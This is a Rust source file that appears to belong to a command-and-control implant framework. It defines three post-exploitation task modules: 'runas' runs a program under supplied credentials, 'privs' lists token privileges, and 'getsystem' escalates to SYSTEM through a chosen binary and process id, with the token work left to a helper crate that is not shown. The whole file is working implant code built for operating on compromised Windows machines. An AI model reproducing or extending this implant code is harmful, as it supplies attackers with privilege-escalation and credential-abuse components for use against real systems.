use crate::{check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult};
use malefic_proto::proto::implantpb::{spite::Body};
use async_trait::async_trait;
use malefic_trait::module_impl;


pub struct RunAs {}

#[async_trait]
#[module_impl("runas")]
impl Module for RunAs {}

#[async_trait]
impl ModuleImpl for RunAs {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RunasRequest)?;
        
        let username = check_field!(req.username)?;
        let domain = check_field!(req.domain)?;
        let password = check_field!(req.password)?;
        let program = check_field!(req.program)?;
        let args = check_field!(req.args)?;
        let show = req.show;
        let netonly = req.netonly;

        malefic_helper::win::token::run_as(&username, &domain, &password, &program, &args, show, netonly)?;
        
        Ok(TaskResult::new(id))
    }
}

pub struct GetPriv {}

#[async_trait]
#[module_impl("privs")]
impl Module for GetPriv {}
#[async_trait]
impl ModuleImpl for GetPriv {
    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
        // 调用 get_privs 函数，获取权限列表
        let privileges = malefic_helper::win::token::get_privs()?;

        // 构建通用响应
        let mut response = malefic_proto::proto::modulepb::Response::default();

        // 将权限信息填入 Response 的 kv 和 array 字段
        for (name, display_name) in privileges {
            response.array.push(format!("{}: {}", name, display_name));
        }

        // 返回带有权限信息的响应
        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}


pub struct GetSystem {}

#[async_trait]
#[module_impl("getsystem")]
impl Module for GetSystem {}

#[async_trait]
impl ModuleImpl for GetSystem {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::Getsystem)?;

        let bin = check_field!(req.bin)?;
        malefic_helper::win::token::get_system(&*bin, req.pid)?;

        Ok(TaskResult::new(id))
    }
}